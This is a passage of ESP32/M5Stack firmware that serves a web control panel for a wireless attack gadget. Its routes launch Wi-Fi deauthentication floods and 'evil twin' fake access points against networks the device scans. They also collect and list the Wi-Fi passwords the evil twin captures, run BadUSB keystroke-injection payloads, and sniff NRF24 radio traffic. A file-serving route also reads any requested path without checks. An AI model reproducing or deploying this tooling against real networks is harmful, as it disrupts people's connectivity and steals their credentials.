                 "\",\"size\":" + f.size() + "}";
            first = false;
        }
        f.close();
        f = root.openNextFile();
    }
    return j + "]";
}

// ─────────────────────────────────────────────────────────────
//  Register web routes (called once per server instance)
// ─────────────────────────────────────────────────────────────
static void _register_routes() {
    // Main UI
    s_srv->on("/", HTTP_GET, [](AsyncWebServerRequest* req) {
        req->send(200, "text/html", FPSTR(RC_HTML));
    });

    // GET /api/status
    s_srv->on("/api/status", HTTP_GET, [](AsyncWebServerRequest* req) {
        const char* st =
            s_rc == RC_IDLE     ? "idle"     :
            s_rc == RC_SCANNING ? "scanning" :
            s_rc == RC_DEAUTH   ? "deauth"   :
            s_rc == RC_ET       ? "evil-twin": "badusb";
        const char* nrf_st =
            s_nrf_mode == NRF_SCAN   ? "scan"     :
            s_nrf_mode == NRF_SNIFF  ? "sniff"    :
            s_nrf_mode == NRF_JAMDET ? "jam-det"  : nullptr;
        String j = "{\"state\":\""; j += st;
        j += "\",\"msg\":\"";       j += s_rc_msg;
        j += "\",\"clients\":";     j += WiFi.softAPgetStationNum();
        if (nrf_st) { j += ",\"nrf\":\""; j += nrf_st; j += "\""; }
        j += "}";
        req->send(200, "application/json", j);
    });

    // POST /api/scan
    s_srv->on("/api/scan", HTTP_POST, [](AsyncWebServerRequest* req) {
        if (s_rc == RC_IDLE) { s_rc = RC_SCANNING; s_rc_msg = "Scanning..."; }
        req->send(200, "application/json", "{\"ok\":true}");
    });

    // GET /api/nets
    s_srv->on("/api/nets", HTTP_GET, [](AsyncWebServerRequest* req) {
        String j = "[";
        for (int i = 0; i < s_net_cnt; i++) {
            if (i) j += ",";
            j += "{\"ssid\":\""; j += s_nets[i].ssid;
            j += "\",\"ch\":";  j += s_nets[i].channel;
            j += ",\"rssi\":";  j += s_nets[i].rssi; j += "}";
        }
        req->send(200, "application/json", j + "]");
    });

    // POST /api/deauth
    s_srv->on("/api/deauth", HTTP_POST,
        [](AsyncWebServerRequest* req){ req->send(200,"application/json","{\"ok\":true}"); },
        nullptr,
        [](AsyncWebServerRequest*, uint8_t* data, size_t len, size_t, size_t){
            if (s_rc != RC_IDLE || s_task_run) return;
            String b((char*)data, len);
            int p, idx=0, sec=30;
            if ((p=b.indexOf("\"idx\":" ))>=0) idx=b.substring(p+6).toInt();
            if ((p=b.indexOf("\"secs\":"))>=0) sec=b.substring(p+7).toInt();
            idx=constrain(idx,0,s_net_cnt-1); sec=constrain(sec,5,300);
            s_atk_idx=idx; s_atk_secs=sec;
            s_rc=RC_DEAUTH; s_rc_msg="Deauth starting...";
        }
    );

    // POST /api/et
    s_srv->on("/api/et", HTTP_POST,
        [](AsyncWebServerRequest* req){ req->send(200,"application/json","{\"ok\":true}"); },
        nullptr,
        [](AsyncWebServerRequest*, uint8_t* data, size_t len, size_t, size_t){
            if (s_rc != RC_IDLE || s_task_run) return;
            String b((char*)data, len);
            int p, idx=0, sec=60;
            if ((p=b.indexOf("\"idx\":" ))>=0) idx=b.substring(p+6).toInt();
            if ((p=b.indexOf("\"secs\":"))>=0) sec=b.substring(p+7).toInt();
            idx=constrain(idx,0,s_net_cnt-1); sec=constrain(sec,5,300);
            s_atk_idx=idx; s_atk_secs=sec;
            s_rc=RC_ET; s_rc_msg="Evil Twin starting...";
        }
    );

    // POST /api/stop
    s_srv->on("/api/stop", HTTP_POST, [](AsyncWebServerRequest* req){
        s_task_run=false; s_rc_msg="Stopping...";
        req->send(200,"application/json","{\"ok\":true}");
    });

    // GET /api/creds
    s_srv->on("/api/creds", HTTP_GET, [](AsyncWebServerRequest* req){
        String j="["; bool first=true;
        String tmp=s_creds; int start=0;
        while (start<(int)tmp.length()) {
            int end=tmp.indexOf('\n',start); if(end<0)end=tmp.length();
            String line=tmp.substring(start,end);
            int p1=line.indexOf("SSID:"), p2=line.indexOf(" PASS:");
            if(p1>=0&&p2>p1){
                if(!first)j+=",";
                j+="{\"ssid\":\""+line.substring(p1+5,p2)+"\",\"pass\":\""+line.substring(p2+6)+"\"}";
                first=false;
            }
            start=end+1;
        }
        req->send(200,"application/json",j+"]");
    });

    // GET /api/rf/rssi — blocked when NRF24 holds the SPI bus
    s_srv->on("/api/rf/rssi", HTTP_GET, [](AsyncWebServerRequest* req){
        if (s_nrf_task_run) {
            // NRF24 task owns the SPI bus — do not touch CC1101
            req->send(200,"application/json",
                "{\"rssi\":-120,\"ready\":false,\"note\":\"NRF active\"}");
            return;
        }
        int rssi = rf_rssi();
        String j = "{\"rssi\":"; j += rssi;
        j += ",\"ready\":"; j += g_rf_ready ? "true" : "false"; j += "}";
        req->send(200,"application/json",j);
    });

    // GET /api/files?dir=/captures&ext=.txt
    s_srv->on("/api/files", HTTP_GET, [](AsyncWebServerRequest* req){
        String dir = req->hasParam("dir") ? req->getParam("dir")->value() : "/captures";
        String ext = req->hasParam("ext") ? req->getParam("ext")->value() : "";
        req->send(200,"application/json",_list_files(dir.c_str(),ext.c_str()));
    });

    // GET /api/file?path=/captures/foo.txt
    s_srv->on("/api/file", HTTP_GET, [](AsyncWebServerRequest* req){
        if (!req->hasParam("path")) { req->send(400,"text/plain","missing path"); return; }
        String path = req->getParam("path")->value();
        if (!SPIFFS.begin(false) || !SPIFFS.exists(path)) {
            req->send(404,"text/plain","not found"); return;
        }
        req->send(SPIFFS, path, "text/plain");
    });

    // POST /api/badusb/run  body: {"path":"/payloads/foo.txt"}
    s_srv->on("/api/badusb/run", HTTP_POST,
        [](AsyncWebServerRequest* req){ req->send(200,"application/json","{\"ok\":true,\"msg\":\"Running...\"}"); },
        nullptr,
        [](AsyncWebServerRequest*, uint8_t* data, size_t len, size_t, size_t){
            if (s_rc != RC_IDLE || s_task_run) return;
            String b((char*)data, len);
            int p=b.indexOf("\"path\":\"");
            if (p<0) return;
            String path=b.substring(p+8);
            path=path.substring(0,path.indexOf('"'));
            path.toCharArray(s_badusb_path,sizeof(s_badusb_path));
            s_rc=RC_BADUSB; s_task_run=true;
            s_rc_msg=String("BadUSB: ")+s_badusb_path;
            xTaskCreate(_badusb_task,"rc_badusb",4096,nullptr,1,&s_task_h);
        }
    );

    // ── NRF24 routes ──────────────────────────────────────────

    // POST /api/nrf/scan/start
    s_srv->on("/api/nrf/scan/start", HTTP_POST, [](AsyncWebServerRequest* req){
        if (!s_nrf_task_run) {
            _nrf_stop();   // clean up any prior task
            s_nrf_mode     = NRF_SCAN;
            s_nrf_task_run = true;
            xTaskCreate(_nrf_scan_task, "nrf_scan", 4096, nullptr, 1, &s_nrf_task_h);
        }
        req->send(200,"application/json","{\"ok\":true}");
    });

    // GET /api/nrf/scan/data  → {sweeps:N, ch:[0..255 × 126]}
    s_srv->on("/api/nrf/scan/data", HTTP_GET, [](AsyncWebServerRequest* req){
        String j = "{\"sweeps\":"; j += s_nrf_sweep_cnt; j += ",\"ch\":[";
        for (int i = 0; i < NRF_CH_COUNT; i++) {
            if (i) j += ",";
            j += s_nrf_ch_power[i];
        }
        req->send(200,"application/json", j + "]}");
    });

    // POST /api/nrf/sniff/start  body: {"rate":0}  (0=1M 1=250K 2=2M)
    s_srv->on("/api/nrf/sniff/start", HTTP_POST,
        [](AsyncWebServerRequest* req){ req->send(200,"application/json","{\"ok\":true}"); },
        nullptr,
        [](AsyncWebServerRequest*, uint8_t* data, size_t len, size_t, size_t){
            if (s_nrf_task_run) return;
            String b((char*)data, len);
            int p = b.indexOf("\"rate\":");
            s_nrf_sniff_rate  = (uint8_t)(p >= 0 ? constrain(b.substring(p+7).toInt(),0,2) : 0);
            s_nrf_pkt_head    = s_nrf_pkt_tail = 0;
            s_nrf_pkt_total   = 0;
            s_nrf_mode        = NRF_SNIFF;
            s_nrf_task_run    = true;
            xTaskCreate(_nrf_sniff_task, "nrf_sniff", 4096, nullptr, 1, &s_nrf_task_h);
        }
    );

    // GET /api/nrf/sniff/pkts  → {total:N, pkts:[{ch,rate,hex},...]}
    s_srv->on("/api/nrf/sniff/pkts", HTTP_GET, [](AsyncWebServerRequest* req){
        static const char* RATE_NAMES[3] = {"1M","250K","2M"};
        String j = "{\"total\":"; j += s_nrf_pkt_total; j += ",\"pkts\":[";
        bool first = true;
        uint8_t i = s_nrf_pkt_tail;
        while (i != s_nrf_pkt_head) {
            if (!first) j += ",";
            uint8_t ri = s_nrf_pkts[i].rate_idx < 3 ? s_nrf_pkts[i].rate_idx : 0;
            j += "{\"ch\":"; j += s_nrf_pkts[i].ch;
            j += ",\"rate\":\""; j += RATE_NAMES[ri]; j += "\",\"hex\":\"";
            for (int b = 0; b < 16; b++) {
                char hx[4]; snprintf(hx, sizeof(hx), "%02X ", s_nrf_pkts[i].data[b]);
                j += hx;
            }
            j += "\"}";
            first = false;
            i = (i + 1) % NRF_PKT_BUF;
        }
        req->send(200,"application/json", j + "]}");
    });

    // POST /api/nrf/jamdet/start
    s_srv->on("/api/nrf/jamdet/start", HTTP_POST, [](AsyncWebServerRequest* req){
        if (!s_nrf_task_run) {
            _nrf_stop();
            s_nrf_mode     = NRF_JAMDET;
            s_nrf_task_run = true;
            xTaskCreate(_nrf_jamdet_task, "nrf_jam", 4096, nullptr, 1, &s_nrf_task_h);
        }
        req->send(200,"application/json","{\"ok\":true}");
    });

    // GET /api/nrf/jamdet/status  → {hot,max_hot,sweeps,warn,alarm}
    s_srv->on("/api/nrf/jamdet/status", HTTP_GET, [](AsyncWebServerRequest* req){
        String j = "{\"hot\":"; j += s_nrf_hot;
        j += ",\"max_hot\":"; j += s_nrf_max_hot;
        j += ",\"sweeps\":";  j += s_nrf_sweeps;
        j += ",\"warn\":";    j += s_nrf_warn  ? "true":"false";
        j += ",\"alarm\":";   j += s_nrf_alarm ? "true":"false";
        j += "}";
        req->send(200,"application/json",j);
    });

    // POST /api/nrf/stop  — stops whichever NRF task is running
    s_srv->on("/api/nrf/stop", HTTP_POST, [](AsyncWebServerRequest* req){
        s_nrf_task_run = false;
        s_nrf_mode     = NRF_IDLE;
        req->send(200,"application/json","{\"ok\":true}");
    });
}

// ─────────────────────────────────────────────────────────────
//  Management AP + server lifecycle
// ─────────────────────────────────────────────────────────────
static void _stop_mgmt() {
    if (s_srv) { s_srv->end(); delete s_srv; s_srv = nullptr; }
}

static void _start_mgmt() {
    WiFi.persistent(false);
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);
    WiFi.mode(WIFI_AP);
    delay(50);
    IPAddress local(192,168,6,1), gw(192,168,6,1), sub(255,255,255,0);
    WiFi.softAPConfig(local, gw, sub);
    WiFi.softAP(MGMT_SSID, MGMT_PASS, MGMT_CH);
    delay(300);

    if (s_srv) { s_srv->end(); delete s_srv; }
    s_srv = new AsyncWebServer(80);
    _register_routes();
    s_srv->begin();
}

// ─────────────────────────────────────────────────────────────
//  WiFi scan — WIFI_AP_STA keeps management AP alive
// ─────────────────────────────────────────────────────────────
static void _do_scan() {
    WiFi.mode(WIFI_AP_STA);
    delay(100);
    IPAddress local(192,168,6,1), gw(192,168,6,1), sub(255,255,255,0);
    WiFi.softAPConfig(local, gw, sub);
    WiFi.softAP(MGMT_SSID, MGMT_PASS, MGMT_CH);
    delay(200);

    s_net_cnt = 0;
    int n = WiFi.scanNetworks(false, true);
    if (n < 0) n = 0;
    if (n > 30) n = 30;
    for (int i = 0; i < n; i++) {
        strncpy(s_nets[i].ssid, WiFi.SSID(i).c_str(), 32);
        s_nets[i].ssid[32] = '\0';
        memcpy(s_nets[i].bssid, WiFi.BSSID(i), 6);
        s_nets[i].rssi    = WiFi.RSSI(i);
        s_nets[i].channel = WiFi.channel(i);
        s_net_cnt++;
    }
    WiFi.scanDelete();

    WiFi.mode(WIFI_AP);
    delay(50);
    WiFi.softAPConfig(local, gw, sub);
    WiFi.softAP(MGMT_SSID, MGMT_PASS, MGMT_CH);
    delay(200);

    s_rc     = RC_IDLE;
    s_rc_msg = String(s_net_cnt) + " networks found";
}

// ─────────────────────────────────────────────────────────────
//  remote_ctrl_run() — blocking, exits on BtnB
// ─────────────────────────────────────────────────────────────
void remote_ctrl_run() {
    s_rc        = RC_IDLE;
    s_rc_msg    = "Ready";
    s_creds     = "";
    s_cap_pass  = "";
    s_net_cnt   = 0;
    s_task_run  = false;
    s_atk_done  = false;
    s_task_h    = nullptr;

    // NRF24 headless state reset
    s_nrf_mode     = NRF_IDLE;
    s_nrf_task_run = false;
    s_nrf_task_h   = nullptr;
    memset(s_nrf_ch_power, 0, sizeof(s_nrf_ch_power));
    s_nrf_sweep_cnt = s_nrf_pkt_total = 0;
    s_nrf_pkt_head  = s_nrf_pkt_tail  = 0;
    s_nrf_hot = s_nrf_max_hot = s_nrf_sweeps = 0;
    s_nrf_warn = s_nrf_alarm = false;

    display_clear();
    draw_header("Remote Ctrl");
    M5.Lcd.setTextSize(1);
    M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
    M5.Lcd.setCursor(4, CONTENT_Y + 4);  M5.Lcd.print("AP: " MGMT_SSID);
    M5.Lcd.setCursor(4, CONTENT_Y + 16); M5.Lcd.print("PW: " MGMT_PASS);
    M5.Lcd.setCursor(4, CONTENT_Y + 28); M5.Lcd.print("IP:  192.168.6.1");
    M5.Lcd.setTextColor(CLR_TEXT_DIM, CLR_BG);
    M5.Lcd.setCursor(4, CONTENT_Y + 42); M5.Lcd.print("Open IP in browser");
    draw_footer("", "B:exit");

    _start_mgmt();
    _disp_status("AP up — connect & browse", CLR_SUCCESS);

    while (true) {
        M5.update();

        // ── WiFi scan (AP stays up via WIFI_AP_STA) ──────────
        if (s_rc == RC_SCANNING) {
            _disp_status("Scanning (AP live)...", CLR_WARN);
            _do_scan();
            _disp_status(s_rc_msg.c_str(), CLR_SUCCESS);
        }

        // ── Launch deauth task ───────────────────────────────
        if (s_rc == RC_DEAUTH && !s_task_run) {
            s_task_run = true;
            _stop_mgmt();

            WiFi.persistent(false);
            WiFi.disconnect(true);
            WiFi.mode(WIFI_OFF);
            delay(150);
            WiFi.mode(WIFI_AP);
            delay(50);
            WiFi.softAP("", "", s_nets[s_atk_idx].channel, /*hidden=*/1);
            delay(300);
            esp_wifi_set_channel(s_nets[s_atk_idx].channel, WIFI_SECOND_CHAN_NONE);

            _disp_status(("Deauthing " + String(s_atk_secs) + "s...").c_str(),
                         CLR_PRIMARY);
            xTaskCreate(_deauth_task, "rc_deauth", 4096,
                        (void*)(intptr_t)s_atk_idx, 1, &s_task_h);
        }

        // ── Launch evil twin task ────────────────────────────
        if (s_rc == RC_ET && !s_task_run) {
            s_task_run = true;
            _stop_mgmt();
            _disp_status(("Evil Twin " + String(s_atk_secs) + "s...").c_str(),
                         CLR_WARN);
            xTaskCreate(_et_task, "rc_et", 8192,
                        (void*)(intptr_t)s_atk_idx, 1, &s_task_h);
        }

        // ── Restart mgmt AP after attack / badusb ───────────
        if (s_atk_done) {
            s_atk_done = false;
            s_task_h   = nullptr;
            delay(200);
            _start_mgmt();
            _disp_status("AP back — reconnect & refresh", CLR_SUCCESS);
        }

        // ── NRF24 status on display ──────────────────────────
        if (s_nrf_task_run) {
            const char* nm =
                s_nrf_mode == NRF_SCAN   ? "scan" :
                s_nrf_mode == NRF_SNIFF  ? "sniff" : "jam";
            M5.Lcd.fillRect(0, CONTENT_Y + 40, DISP_W, 10, CLR_BG);
            M5.Lcd.setTextSize(1);
            M5.Lcd.setTextColor(CLR_PRIMARY, CLR_BG);
            M5.Lcd.setCursor(4, CONTENT_Y + 42);
            M5.Lcd.printf("NRF24 %s active", nm);
        }

        // ── Exit ─────────────────────────────────────────────
        if (M5.BtnB.wasPressed() || M5.BtnB.pressedFor(LONG_PRESS_MS)) {
            s_task_run     = false;
            s_nrf_task_run = false;   // signal NRF task to stop
            delay(400);               // let tasks settle
            _stop_mgmt();
            WiFi.softAPdisconnect(true);
            WiFi.mode(WIFI_OFF);
            delay(100);
            break;
        }

        delay(20);
    }
}
